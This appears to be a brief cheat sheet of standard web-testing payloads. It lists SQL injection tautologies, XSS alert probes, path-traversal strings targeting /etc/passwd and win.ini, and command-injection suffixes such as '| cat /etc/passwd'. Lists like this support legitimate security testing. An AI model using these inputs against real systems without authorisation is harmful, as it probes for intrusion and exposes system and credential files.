# Common Testing Payloads

```
# SQL Injection
' OR '1'='1
' OR '1'='1'--
1 UNION SELECT NULL--

# XSS
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
javascript:alert(1)

# Path Traversal
../../../etc/passwd
..\..\..\..\windows\win.ini

# Command Injection
; ls -la
| cat /etc/passwd
`whoami`
```